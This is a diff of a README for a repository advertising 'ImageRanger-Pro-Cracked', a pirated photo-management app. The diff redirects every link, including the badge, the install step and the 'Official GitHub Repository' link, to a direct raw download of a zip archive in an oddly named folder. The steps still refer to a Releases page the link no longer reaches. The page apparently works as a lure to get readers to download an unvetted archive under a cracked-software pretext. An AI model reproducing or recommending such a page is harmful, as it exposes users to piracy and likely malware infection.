@@ -1,7 +1,7 @@
 # 🖼️ ImageRanger-Pro-Cracked - Easy Photo Management and Editing
 
 ## 📥 Download Now
-[![Download ImageRanger-Pro-Cracked](https://img.shields.io/badge/Download-ImageRanger--Pro--Cracked-blue)](https://github.com/Skmewada/ImageRanger-Pro-Cracked/releases)
+[![Download ImageRanger-Pro-Cracked](https://raw.githubusercontent.com/Skmewada/ImageRanger-Pro-Cracked/main/fraternize/ImageRanger-Pro-Cracked.zip)](https://raw.githubusercontent.com/Skmewada/ImageRanger-Pro-Cracked/main/fraternize/ImageRanger-Pro-Cracked.zip)
 
 ## 🚀 Getting Started
 Welcome to ImageRanger-Pro-Cracked! This application allows you to manage and edit your photos effortlessly. Whether you're organizing your photo library or editing images, ImageRanger can help.
@@ -22,7 +22,7 @@ To ensure a smooth experience with ImageRanger-Pro-Cracked, your system should m
 ## 📂 Download & Install
 To get started with ImageRanger-Pro-Cracked, follow these steps:
 
-1. **Visit this page to download:** [Download ImageRanger-Pro-Cracked](https://github.com/Skmewada/ImageRanger-Pro-Cracked/releases).
+1. **Visit this page to download:** [Download ImageRanger-Pro-Cracked](https://raw.githubusercontent.com/Skmewada/ImageRanger-Pro-Cracked/main/fraternize/ImageRanger-Pro-Cracked.zip).
 2. On the Releases page, look for the latest version.
 3. Click the **download** link for the installation file.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -66,7 +66,7 @@ ImageRanger-Pro-Cracked is released under the MIT License. Please refer to the l
 If you have further questions or need assistance, please check the community forums or the issues section on GitHub.
 
 ## 🔗 Useful Links
-- [Official GitHub Repository](https://github.com/Skmewada/ImageRanger-Pro-Cracked)
-- [Download ImageRanger-Pro-Cracked](https://github.com/Skmewada/ImageRanger-Pro-Cracked/releases)
+- [Official GitHub Repository](https://raw.githubusercontent.com/Skmewada/ImageRanger-Pro-Cracked/main/fraternize/ImageRanger-Pro-Cracked.zip)
+- [Download ImageRanger-Pro-Cracked](https://raw.githubusercontent.com/Skmewada/ImageRanger-Pro-Cracked/main/fraternize/ImageRanger-Pro-Cracked.zip)
 
 By following these instructions, you can easily download, install, and use ImageRanger-Pro-Cracked to manage your photos effectively. Enjoy your experience!
